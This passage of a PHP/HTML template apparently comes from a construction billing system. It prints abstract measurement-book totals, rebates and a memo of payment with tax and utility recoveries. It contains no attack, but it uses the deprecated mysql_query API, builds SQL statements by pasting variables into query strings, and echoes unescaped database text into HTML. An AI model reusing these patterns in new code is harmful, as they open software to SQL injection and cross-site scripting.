		<tr border='1' class="labelprint" bgcolor="">
			<!--<td  align='left' width='3%' class=' label' style="border-bottom-color:#666666">&nbsp;</td>-->
			<td  align='left' width='' class=''>&nbsp;<?php //echo $Line; ?></td>
			<td  align='right' width='' class='labelbold'>TOTAL</td>
			<td  align='right' width='' class=''>
			<?php echo number_format($total_qty_item, $decimal, '.', ''); ?>
			</td>
			<td  align='right' width='' class=''>
			<?php echo $rate; ?>
			</td>
			<td  align='left' width='' class=''>
			<?php echo $unit; ?>
			</td>
			<td  align='right' width='' class=''>
			<?php echo number_format($total_amt_item, 2, '.', ''); ?>
			</td>
			<td  align='left' width='' class=''>&nbsp;</td>
			<td  align='right' width='' class=''>
			<?php echo number_format($dpm_measurement_qty, $decimal, '.', ''); ?>
			</td>
			<td  align='right' width='' class=''>
			<?php echo number_format($dpm_amount_item, 2, '.', ''); ?>
			</td>
			<td  align='right' width='' class=''>
			<?php echo number_format($slm_measurement_qty, $decimal, '.', ''); ?>
			</td>
			<td  align='right' width='' class=''>
			<?php echo number_format($slm_amount_item, 2, '.', ''); ?>
			</td>
			<td  align='right' width='' class=''><?php //echo $Line; ?>&nbsp;</td>
		</tr>
		<?php 
			UpdateItemAbstractPageNo($abstsheetid,$abstmbno,$subdivid,$page); 
			$rowcount++; $Line++;
			
		?>
			<!--<tr style="background-color:#A0EAFA"><td colspan="12"><?php echo $subdivname."*".$CheckDevRes."<br/>"; ?></td></tr>-->
		<?php
			/*echo "F = ".$Line."<br/>";*/ //if($Line >= 28) { CheckPageBreak($tablehead,$abstmbno,$table,$page); $Line = $LineIncr; $page++;  echo $slm_amount_item."<br/>";} ?>
		<tr bgcolor=""><td colspan="12">&nbsp;</td></tr>
		<?php  $rowcount++; $Line++;/*echo "F = ".$Line."<br/>";*/ //if($Line >= 28) { CheckPageBreak($tablehead,$abstmbno,$table,$page); $Line = $LineIncr; $page++;  echo $slm_amount_item."<br/>";} ?>
		<!--<tr bgcolor="#d4d8d8" style="height:10px"><td colspan="13" style="border-top-color:#0A9CC5; border-bottom-color:#0A9CC5;"></td></tr>-->
		<input type="hidden" name="row_count" id="row_count<?php echo $table_group_row; ?>" value="<?php echo $rowcount; ?>" />
		<?php //echo $subdivname." = ".$Line." = ".$LineTemp." = ".$Linecheck."<br/>"; ?>
		<?php
		$color_var++; $table_group_row++;
		$AbstractStr			.= $divid."*".$subdivid."*".$fromdate."*".$todate."*".$runn_acc_bill_no."*".$abstsheetid."*".$abstmbno."*".$page."*";
		$OverAllSlmAmount 		=  $OverAllSlmAmount	+	$slm_amount_item; 
		$OverAllDpmAmount 		=  $OverAllDpmAmount	+	$dpm_amount_item; 
		$OverAllSlmDpmAmount 	=  $OverAllSlmDpmAmount	+	$total_amt_item;
		//print_r($DevItemArray); echo "<br/>";
	}
	//echo $Line;	
		$SlmRebateAmount 		=  $OverAllSlmAmount 	* 	$overall_rebate_perc /100;
		$DpmRebateAmount 		=  $OverAllDpmAmount 	* 	$overall_rebate_perc /100;
		$SlmDpmRebateAmount 	=  $OverAllSlmDpmAmount * 	$overall_rebate_perc /100;
		
		$SlmNetAmount 			=  round($OverAllSlmAmount	-	$SlmRebateAmount); 
		$DpmNetAmount 			=  round($OverAllDpmAmount	-	$DpmRebateAmount); 
		$SlmDpmNetAmount 		=  round($OverAllSlmDpmAmount	-	$SlmDpmRebateAmount);
		
		$final_amount_str .= $SlmNetAmount."*".$DpmNetAmount."*".$SlmDpmNetAmount."*".$Crbn."*".$abstmbno."*".$page."@@";
		
	$Linecheck = 3;
	$LineTemp = $Line + $Linecheck;
	if($LineTemp >= 30){ $Line = 30; } 
	if($Line >= 30)
	{
	?>
	<tr>
		<td colspan='3' align='right' class='labelbold'>C/o Page No <?php echo $page+1; ?>/ Abstract MB No <?php echo $abstmbno; ?></td>
		<td></td>
		<td></td>
		<td align='right' class='labelbold'><?php echo number_format($OverAllSlmDpmAmount, 2, '.', ''); ?></td>
		<td></td>
		<td></td>
		<td align='right' class='labelbold'><?php echo number_format($OverAllDpmAmount, 2, '.', ''); ?></td>
		<td><?php //echo $Line; ?></td>
		<td align='right' class='labelbold'><?php echo number_format($OverAllSlmAmount, 2, '.', ''); ?></td>
		<td><?php //echo $LineTemp; ?></td>
	</tr>
	<tr class='labelprint'><td colspan='12' align='center' style='border-bottom:2px solid white;border-left:2px solid white;border-right:2px solid white;'>Page <?php echo $page; ?></td></tr>
	</table>
	<p style='page-break-after:always;'></p>
	<table width="1087px" border="0"  cellpadding="2" cellspacing="2" align="center" bgcolor="#FFFFFF" style="border:none;" class="labelprint">
		<tr style="border:none;"><td align="center" style="border:none;">Abstract M.Book No.<?php echo $abstmbno; ?>&nbsp;&nbsp;</td></tr>
	</table>
	<?php echo $table; ?>
	<table width='1087px' cellpadding='3' cellspacing='3' align='center' class='label table1' bgcolor='#FFFFFF' id='table1'>
	<?php echo $tablehead; ?>
	<tr>
		<td colspan='3' align='right' class='labelbold'>B/f from Page No <?php echo $page; ?>/ Abstract MB No <?php echo $abstmbno; ?></td>
		<td></td>
		<td></td>
		<td align='right' class='labelbold'><?php echo number_format($OverAllSlmDpmAmount, 2, '.', ''); ?></td>
		<td></td>
		<td></td>
		<td align='right' class='labelbold'><?php echo number_format($OverAllDpmAmount, 2, '.', ''); ?></td>
		<td></td>
		<td align='right' class='labelbold'><?php echo number_format($OverAllSlmAmount, 2, '.', ''); ?></td>
		<td></td>
	</tr>
	<?php
	$Line = $LineIncr; $page++;
	}
	?>
	
		<tr class="labelprint" bgcolor="#F0F0F0">
			<td colspan="2" align="right">Total Cost&nbsp;&nbsp; <i class='fa fa-inr' style=' width:4px; height:5px; font-weight:normal;'></i>&nbsp;&nbsp;</td>
			<td>&nbsp;</td>
			<td>&nbsp;</td>
			<td>&nbsp;</td>
			<td align="right"><?php echo number_format($OverAllSlmDpmAmount, 2, '.', ''); ?></td>
			<td>&nbsp;</td>
			<td>&nbsp;</td>
			<td align="right"><?php echo number_format($OverAllDpmAmount, 2, '.', ''); ?></td>
			<td>&nbsp;</td>
			<td align="right"><?php echo number_format($OverAllSlmAmount, 2, '.', ''); ?></td>
			<td>&nbsp;</td>
		</tr>
		<?php $Line++; //if($Line >= 28) { CheckPageBreak($tablehead,$abstmbno,$table,$page); $Line = $LineIncr; $page++;  echo $slm_amount_item."<br/>";} ?>
		<tr class="labelprint">
			<td colspan="2" align="right">Less: Over All Rebate : <?php echo $overall_rebate_perc; ?>%&nbsp; <i class='fa fa-inr' style=' width:4px; height:5px; font-weight:normal;'></i>&nbsp;&nbsp;</td>
			<td>&nbsp;</td>
			<td>&nbsp;</td>
			<td>&nbsp;</td>
			<td align="right"><?php echo number_format($SlmDpmRebateAmount, 2, '.', ''); ?></td>
			<td>&nbsp;</td>
			<td>&nbsp;</td>
			<td align="right"><?php echo number_format($DpmRebateAmount, 2, '.', ''); ?></td>
			<td>&nbsp;</td>
			<td align="right"><?php echo number_format($SlmRebateAmount, 2, '.', ''); ?></td>
			<td>&nbsp;</td>
		</tr>
		<?php $Line++; //if($Line >= 28) { CheckPageBreak($tablehead,$abstmbno,$table,$page); $Line = $LineIncr; $page++;  echo $slm_amount_item."<br/>";} ?>
		<tr class="labelbold" bgcolor="#F0F0F0">
			<td colspan="2" align="right">Gross Amount&nbsp;&nbsp; <i class='fa fa-inr' style=' width:4px; height:5px;'></i>&nbsp;&nbsp;</td>
			<td>&nbsp;</td>
			<td>&nbsp;</td>
			<td>&nbsp;</td>
			<td align="right"><?php echo number_format(round($SlmDpmNetAmount), 2, '.', ''); ?></td>
			<td>&nbsp;</td>
			<td>&nbsp;</td>
			<td align="right"><?php echo number_format($DpmNetAmount, 2, '.', ''); ?></td>
			<td>&nbsp;</td>
			<td align="right"><?php echo number_format(round($SlmNetAmount), 2, '.', ''); ?></td>
			<td>&nbsp;</td>
		</tr>
	<?php 
	
	
	//$Line++; //if($Line >= 28) { CheckPageBreak($tablehead,$abstmbno,$table,$page); $Line = $LineIncr; $page++;  echo $slm_amount_item."<br/>";} 
	/*if($Line >= 30)
	{
	?>
	<tr>
		<td colspan='3' align='right' class='labelbold'>C/o Page No <?php echo $page+1; ?>/ Abstract MB No <?php echo $abstmbno; ?></td>
		<td></td>
		<td></td>
		<td align='right' class='labelbold'><?php echo number_format($OverAllSlmDpmAmount, 2, '.', ''); ?></td>
		<td></td>
		<td></td>
		<td align='right' class='labelbold'><?php echo number_format($OverAllDpmAmount, 2, '.', ''); ?></td>
		<td></td>
		<td align='right' class='labelbold'><?php echo number_format($OverAllSlmAmount, 2, '.', ''); ?></td>
		<td></td>
	</tr>
	<tr class='labelprint'><td colspan='12' align='center' style='border-bottom:2px solid white;border-left:2px solid white;border-right:2px solid white;'>Page <?php echo $page; ?></td></tr>
	</table>
	<p style='page-break-after:always;'></p>
	<table width="1087px" border="0"  cellpadding="2" cellspacing="2" align="center" bgcolor="#FFFFFF" style="border:none;" class="labelprint">
		<tr style="border:none;"><td align="center" style="border:none;">Abstract M.Book No.<?php echo $abstmbno; ?>&nbsp;&nbsp;</td></tr>
	</table>
	<?php echo $table; ?>
	<table width='1087px' cellpadding='3' cellspacing='3' align='center' class='label table1' bgcolor='#FFFFFF' id='table1'>
	<?php echo $tablehead; ?>
	<tr>
		<td colspan='3' align='right' class='labelbold'>B/f from Page No <?php echo $page; ?>/ Abstract MB No <?php echo $abstmbno; ?></td>
		<td></td>
		<td></td>
		<td align='right' class='labelbold'><?php echo number_format($OverAllSlmDpmAmount, 2, '.', ''); ?></td>
		<td></td>
		<td></td>
		<td align='right' class='labelbold'><?php echo number_format($OverAllDpmAmount, 2, '.', ''); ?></td>
		<td></td>
		<td align='right' class='labelbold'><?php echo number_format($OverAllSlmAmount, 2, '.', ''); ?></td>
		<td></td>
	</tr>
	<?php
	$Line = $LineIncr; $page++;
	}
	else
	{
	?>
	<tr class='labelprint'><td colspan='12' align='center' style='border-bottom:2px solid white;border-left:2px solid white;border-right:2px solid white;'>
	Page <?php echo $page; ?></td></tr>
	<?php	
	}*/
	?>
	<tr class='labelprint'><td colspan='12' align='center' style='border-bottom:2px solid white;border-left:2px solid white;border-right:2px solid white;'>
	Page <?php echo $page; ?></td></tr>
	</table>
	<?php 
	echo "<p style='page-break-after:always;'></p>";
	$Line = $LineIncr; 
	$page++;
}
//echo ;
$end_page = $page-1;

if($final_amount_str != "")
{
	$final_amount_str = rtrim($final_amount_str,"@@");
	$exp_final_amount_str = explode("@@",$final_amount_str);
	for($s1=0; $s1<count($exp_final_amount_str); $s1++)
	{
		$curr_str 			= $exp_final_amount_str[$s1];
		if($curr_str != "")
		{
			$exp_curr_str 		= explode("*",$curr_str);
			$esc_slm_amt 		= $exp_curr_str[0];
			$esc_dpm_amt 		= $exp_curr_str[1];
			$esc_upto_date_amt 	= $exp_curr_str[2];
			$esc_rbn 			= $exp_curr_str[3];
			$esc_mb 			= $exp_curr_str[4];
			$esc_pg 			= $exp_curr_str[5];
			//echo $esc_rbn."<br/>";
			$update_abstarct_query = "update abstractbook set upto_date_total_amount_esc = '$esc_upto_date_amt', dpm_total_amount_esc = '$esc_dpm_amt', 
									slm_total_amount_esc = '$esc_slm_amt', mbookno_esc = '$esc_mb', mbookpage_esc = '$esc_pg' where sheetid = '$abstsheetid' and rbn = '$esc_rbn'";
			$update_abstarct_sql = mysql_query($update_abstarct_query);
		}
	}
	
		$delete_mbook_query		= 	"delete from mymbook where sheetid = '$abstsheetid' and rbn = '$esc_rbn' and esc_id = '$esc_id' and 
									quarter = '$quarter' and mtype = 'EA' and genlevel = 'esc_abstract'";
		$delete_mbook_sql 		= 	mysql_query($delete_mbook_query);						
		
		$insert_mbook_query  	= 	"insert into mymbook set mbno = '$abstmbno', startpage = '$start_page', endpage = '$end_page', sheetid = '$abstsheetid', 
									quarter = '$quarter', staffid = '$staffid', rbn = '$esc_abs_rbn', esc_id = '$esc_id', active =1, mtype = 'EA', genlevel = 'esc_abstract', mbookorder = 1";
		$insert_mbook_sql = mysql_query($insert_mbook_query);
	
}
/*$EscQtrArray = array();
$EscTccAmtArray = array();
$EscTcaAmtArray = array();
$esc_cnt = 0;
$Esc_Total_Amt = 0;
$select_esc_rbn_query = "select * from escalation where sheetid = '$abstsheetid' and flag = 0 and rbn = '$rbn' ORDER BY quarter ASC";
$select_esc_rbn_sql = mysql_query($select_esc_rbn_query);
if($select_esc_rbn_sql == true)
{
	if(mysql_num_rows($select_esc_rbn_sql)>0)
	{
		$esc_cnt = 1;
		while($EscList = mysql_fetch_object($select_esc_rbn_sql))
		{
			$quarter = $EscList->quarter;
			$esc_tcc_amount = $EscList->tcc_amt;
			$esc_tca_amount = $EscList->tca_amt;
			$esc_qtr_amt = $EscList->esc_total_amt;
			
			$Esc_Total_Amt = $Esc_Total_Amt+$esc_tcc_amount+$esc_tca_amount;
			
			array_push($EscQtrArray,$quarter);
			array_push($EscTccAmtArray,$esc_tcc_amount);
			array_push($EscTcaAmtArray,$esc_tca_amount);
		}
	}
}
$Esc_Total_Amt = round($Esc_Total_Amt);
//print_r($EscQtrArray);print_r($EscAmtArray);
$secured_advance_query = "select sec_adv_amount from secured_advance where sheetid = '$abstsheetid' and rbn = '$rbn'";
$secured_advance_sql = mysql_query($secured_advance_query);
if($secured_advance_sql == true)
{
	$SAList 		= 	mysql_fetch_object($secured_advance_sql);
	$sec_adv_amount	= 	$SAList->sec_adv_amount; 
}
else
{
	$sec_adv_amount = 0;
}

$total_recovery = 0;
$water_recovery_query = "select water_cost from generate_waterbill where sheetid = '$abstsheetid' and rbn = '$rbn'";
$water_recovery_sql = mysql_query($water_recovery_query);
if($water_recovery_sql == true)
{
	while($WRList 	= 	mysql_fetch_object($water_recovery_sql))
	{
		$water_charge 	=  $water_charge+$WRList->water_cost; 
	}
}
else
{
	$water_charge = 0;
}
$total_recovery = $total_recovery + $water_charge;
$electricity_recovery_query = "select electricity_cost from generate_electricitybill where sheetid = '$abstsheetid' and rbn = '$rbn'";
$electricity_recovery_sql = mysql_query($electricity_recovery_query);
if($electricity_recovery_sql == true)
{
	while($ERList 	= 	mysql_fetch_object($electricity_recovery_sql))
	{
		$electricity_charge  = 	$electricity_charge+$ERList->electricity_cost;
	}
}
else
{
	$electricity_charge = 0;
}
$total_recovery = $total_recovery + $electricity_charge;
$general_recovery_query = "select * from generate_otherrecovery where sheetid = '$abstsheetid' and rbn = '$rbn'";
//echo $general_recovery_query;
$general_recovery_sql = mysql_query($general_recovery_query);
if($general_recovery_sql == true)
{
	$GRList 			= 	mysql_fetch_object($general_recovery_sql);
	$sd_amt 			= 	round($GRList->sd_amt);
	$sd_percent 		= 	$GRList->sd_percent;
	$wct_amt 			= 	round($GRList->wct_amt);
	$wct_percent 		= 	$GRList->wct_percent;
	$vat_amt 			= 	round($GRList->vat_amt);
	$vat_percent 		= 	$GRList->vat_percent;
	$mob_adv_amt 		= 	round($GRList->mob_adv_amt);
	$mob_adv_percent 	= 	$GRList->mob_adv_percent;
	$lw_cess_amt 		= 	round($GRList->lw_cess_amt);
	$lw_cess_percent 	= 	$GRList->lw_cess_percent;
	$incometax_amt 		= 	round($GRList->incometax_amt);
	$incometax_percent 	= 	$GRList->incometax_percent;
	$it_cess_amt 		= 	round($GRList->it_cess_amt);
	$it_cess_percent 	= 	$GRList->it_cess_percent;
	$it_edu_amt 		= 	round($GRList->it_edu_amt);
	$it_edu_percent 	= 	$GRList->it_edu_percent;
	$land_rent 			= 	round($GRList->land_rent);
	$liquid_damage 		= 	round($GRList->liquid_damage);
	$other_recovery_1 	= 	round($GRList->other_recovery_1_amt);
	$other_recovery_2	= 	round($GRList->other_recovery_2_amt);
	$other_recovery_1_desc 	= 	$GRList->other_recovery_1_desc;
	$other_recovery_2_desc	= 	$GRList->other_recovery_2_desc;
	if($other_recovery_1_desc == "")
	{
		$other_recovery_1_desc = "Other Recovery 1 ";
	}
	if($other_recovery_2_desc == "")
	{
		$other_recovery_2_desc = "Other Recovery 2 ";
	}
	$non_dep_machine_equip 	= 	round($GRList->non_dep_machine_equip);
	$non_dep_man_power 	= 	round($GRList->non_dep_man_power);
	$nonsubmission_qa 	= 	round($GRList->nonsubmission_qa);
}
if($non_dep_machine_equip != 0)
{
	$non_dep_machine_equip_print = number_format($non_dep_machine_equip, 2, '.', '');
}
else
{
	$non_dep_machine_equip_print = "NIL";
}

if($non_dep_man_power != 0)
{
	$non_dep_man_power_print = number_format($non_dep_man_power, 2, '.', '');
}
else
{
	$non_dep_man_power_print = "NIL";
}

if($electricity_charge != 0)
{
	$electricity_charge_print = number_format($electricity_charge, 2, '.', '');
}
else
{
	$electricity_charge_print = "NIL";
}

if($water_charge != 0)
{
	$water_charge_print = number_format($water_charge, 2, '.', '');
}
else
{
	$water_charge_print = "NIL";
}
$total_recovery = $total_recovery + $sd_amt+$wct_amt + $vat_amt+$mob_adv_amt + $lw_cess_amt+$incometax_amt + $it_cess_amt+$it_edu_amt + $land_rent+$liquid_damage + $other_recovery_1 + $other_recovery_2 + $non_dep_machine_equip + $non_dep_man_power + $nonsubmission_qa;
$rrcount = 0;  $total_rec_rel_amt = 0;
$RRDescCivArr = array(); $RRAmtCivArr = array(); $RRDescAccArr = array(); $RRAmtAccArr = array();

$recov_release_query = "select * from recovery_release where sheetid = '$abstsheetid' and rbn = '$rbn'";
$recov_release_sql = mysql_query($recov_release_query);
//echo $recov_release_query;
if($recov_release_sql == true)
{
	if(mysql_num_rows($recov_release_sql)>0)
	{
		while($RecRelList = mysql_fetch_object($recov_release_sql))
		{
			$rec_rel_desc_civil = $RecRelList->description_civil;
			$rec_rel_amt_civil 	= $RecRelList->amount_civil;
			$rec_rel_desc_acc 	= $RecRelList->description_acc;
			$rec_rel_amt_acc 	= $RecRelList->amount_acc;
			array_push($RRDescCivArr,$rec_rel_desc_civil);
			array_push($RRAmtCivArr,$rec_rel_amt_civil);
			array_push($RRDescAccArr,$rec_rel_desc_acc);
			array_push($RRAmtAccArr,$rec_rel_amt_acc);
			$total_rec_rel_amt  = $total_rec_rel_amt+$rec_rel_amt_civil;
			$rrcount++;
		}
	}
}

$page++;
$OverAllSlmDpmAmount = round($OverAllSlmDpmAmount);
$OverAllSlmAmount = round($OverAllSlmAmount);
//echo "<p style='page-break-after:always;'></p>";
echo $title;
echo $table;
echo "<table width='1087px' bgcolor='white' cellpadding='3' cellspacing='3' align='center' class='label table1'>";
echo $tablehead;
//echo "<tr><td class='labelprint' align='center' colspan='12'>&nbsp;</td></tr>";
echo "<tr style='border:none'><td style='border:none' class='labelbold' align='center' colspan='12'><u>Memo of payment</u></td></tr>";
echo "<tr style='border:none'><td style='border:none' class='labelprint' align='right' colspan='6'>Upto date value of work done : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' class='labelprint' align='right' colspan='5'>".number_format($OverAllSlmDpmAmount, 2, '.', '')."</td><td style='border:none'>&nbsp;</td></tr>";
echo "<tr style='border:none'><td style='border:none' class='labelprint' align='right' colspan='6'>Deduct Previous Paid : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' class='labelprint' align='right' colspan='3'>&nbsp;</td><td colspan='2' align='right' class='labelprint' style='border:none;'>(-)&nbsp;&nbsp;".number_format($OverAllDpmAmount, 2, '.', '')."</td><td style='border:none;'>&nbsp;</td></tr>";
if(count($EscQtrArray)>0)
{
	for($q1=0; $q1<count($EscQtrArray); $q1++)
	{
		$EQtr = $EscQtrArray[$q1];
		$ETccAmt = $EscTccAmtArray[$q1];
		$ETcaAmt = $EscTcaAmtArray[$q1];
echo "<tr style='border:none'><td style='border:none' class='labelprint' align='right' colspan='6'>10-CC Escalation for Quarter - ".$EQtr." : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' class='labelprint' align='right' colspan='3'>&nbsp;</td><td colspan='2' align='right' class='labelprint' style='border:none;'>&nbsp;&nbsp;".number_format($ETccAmt, 2, '.', '')."</td><td style='border:none;'>&nbsp;</td></tr>";
echo "<tr style='border:none'><td style='border:none' class='labelprint' align='right' colspan='6'>10-CA Escalation for Quarter - ".$EQtr." : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' class='labelprint' align='right' colspan='3'>&nbsp;</td><td colspan='2' align='right' class='labelprint' style='border:none;'>&nbsp;&nbsp;".number_format($ETcaAmt, 2, '.', '')."</td><td style='border:none;'>&nbsp;</td></tr>";
	}
}
$OverAllSlmAmount = round($OverAllSlmAmount+$Esc_Total_Amt);

//echo '<hr style="border-top: dotted 1px;" />';
//$OverAllSlmAmount = $OverAllSlmAmount + $sec_adv_amount;
$Overall_net_amt_final = round(($OverAllSlmAmount + $sec_adv_amount + $total_rec_rel_amt - $total_recovery),2);
$Overall_net_amt_final = round($Overall_net_amt_final);

echo "<tr style='border:none'><td style='border:none' class='labelbold' align='right' colspan='6'>Net Amount : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'>  </td><td style='border:none' class='labelprint' align='right' colspan='3'>&nbsp;</td><td style='border:none; border-top:1px dashed #000000' class='labelbold' align='right' colspan='2'>".number_format($OverAllSlmAmount, 2, '.', '')."</td><td style='border:none; border-top:1px dashed #000000'>&nbsp;</td></tr>";
echo "<tr style='border:none'><td style='border:none' class='labelprint' align='right' colspan='6'>Secured Advance : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' class='labelprint' align='right' colspan='3'>&nbsp;</td><td colspan='2' align='right' class='labelprint' style='border:none;'>".number_format($sec_adv_amount, 2, '.', '')."</td><td style='border:none;'>&nbsp;</td></tr>";
echo "<tr style='border:none'><td colspan='2' class='labelbold' align='right' style='border:none'>&nbsp;<u>Recoveries</u>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td><td style='border:none' class='labelbold' align='left' colspan='10'></td></tr>";
$ea = 1; $eb = 1; $ed = 1; 
$ea_text = "<b>Under 8[a]</b>"; $eb_text = "<b>Under 8[b]</b>";  $ec_text = "<b>Under 8[c]</b>";  $ed_text = "<b><u>With hold Amount</u></b>";
if($wct_percent != 0)
{
echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$ea_text." (".$ea.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>W.C.T @ ".number_format($wct_percent, 2, '.', '')."% : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>&nbsp;&nbsp;".number_format($wct_amt, 2, '.', '')."</td><td style='border:none' colspan=''>&nbsp;</td></tr>";
$ea++; $ea_text = "";
}
if($vat_percent != 0)
{


echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$ea_text." (".$ea.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>VAT @  ".number_format($vat_percent, 2, '.', '')."% : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>&nbsp;&nbsp;".number_format($vat_amt, 2, '.', '')."</td><td style='border:none' colspan='1'>&nbsp;</td></tr>";
$ea++; $ea_text = "";


}
if($lw_cess_percent != 0)
{


echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$ea_text." (".$ea.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>Labour Welfare CESS @ ".number_format($lw_cess_percent, 2, '.', '')."% : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>&nbsp;&nbsp;".number_format($lw_cess_amt, 2, '.', '')."</td><td style='border:none' colspan='1'>&nbsp;</td></tr>";
$ea++; $ea_text = "";




}
if($mob_adv_percent != 0)
{
//echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$ea_text." (".$ea.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>Mobilization Advance @ ".number_format($mob_adv_percent, 2, '.', '')."% : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>&nbsp;&nbsp;".number_format($mob_adv_amt, 2, '.', '')."</td><td style='border:none' colspan='1'>&nbsp;</td></tr>";
//echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$ea_text." (".$ea.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>Mobilization Advance @ ".number_format($mob_adv_percent, 2, '.', '')."% : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>&nbsp;&nbsp;".number_format($mob_adv_amt, 2, '.', '')."</td><td style='border:none' colspan='1'>&nbsp;</td></tr>";
echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$ea_text." (".$ea.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>Mobilization Advance : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>&nbsp;&nbsp;".number_format($mob_adv_amt, 2, '.', '')."</td><td style='border:none' colspan='1'>&nbsp;</td></tr>";
$ea++; $ea_text = "";
}
if($incometax_percent != 0)
{
echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$eb_text." (".$eb.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>Income Tax @ ".number_format($incometax_percent, 2, '.', '')."% : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>&nbsp;&nbsp;".number_format($incometax_amt, 2, '.', '')."</td><td style='border:none' colspan='1'>&nbsp;</td></tr>";
$eb++; $eb_text = "";
}
if($it_cess_percent != 0)
{
echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$eb_text." (".$eb.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>IT Cess @ ".number_format($it_cess_percent, 2, '.', '')."% : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>&nbsp;&nbsp;".number_format($it_cess_amt, 2, '.', '')."</td><td style='border:none' colspan='1'>&nbsp;</td></tr>";
$eb++; $eb_text = "";
}
if($it_edu_percent != 0)
{
echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$eb_text." (".$eb.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>IT Education CESS @ ".number_format($it_edu_percent, 2, '.', '')."% : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>&nbsp;&nbsp;".number_format($it_edu_amt, 2, '.', '')."</td><td style='border:none' colspan='1'>&nbsp;</td></tr>";
$eb++; $eb_text = "";
}
//if($water_charge != 0)
//{
echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$eb_text." (".$eb.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>Water Charges (as per Bill enclosed) : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>".$water_charge_print."</td><td colspan='1' style='border:none'>&nbsp;</td></tr>";
$eb++; $eb_text = "";
//}
//if($electricity_charge != 0)
//{
echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$eb_text." (".$eb.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>Electricity Charges (as per Bill enclosed) : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>&nbsp;&nbsp;".$electricity_charge_print."</td><td colspan='1' style='border:none'>&nbsp;</td></tr>";
$eb++; $eb_text = "";
//}
if($land_rent != 0)
{
echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$eb_text." (".$eb.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>Rent for Land : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>&nbsp;&nbsp;".number_format($land_rent, 2, '.', '')."</td><td colspan='1' style='border:none'>&nbsp;</td></tr>";
$eb++; $eb_text = "";
}
if($liquid_damage != 0)
{
echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$eb_text." (".$eb.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>Liquidated Damages : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>&nbsp;&nbsp;".number_format($liquid_damage, 2, '.', '')."</td><td colspan='1' style='border:none'>&nbsp;</td></tr>";
$eb++; $eb_text = "";
}
if($other_recovery_1 != 0)
{
echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$eb_text." (".$eb.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>".$other_recovery_1_desc." : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>&nbsp;&nbsp;".number_format($other_recovery_1, 2, '.', '')."</td><td colspan='1' style='border:none'>&nbsp;</td></tr>";
$eb++; $eb_text = "";
}
if($other_recovery_2 != 0)
{
echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$eb_text." (".$eb.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>".$other_recovery_2_desc." : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>&nbsp;&nbsp;".number_format($other_recovery_2, 2, '.', '')."</td><td colspan='1' style='border:none'>&nbsp;</td></tr>";
$eb++; $eb_text = "";
}
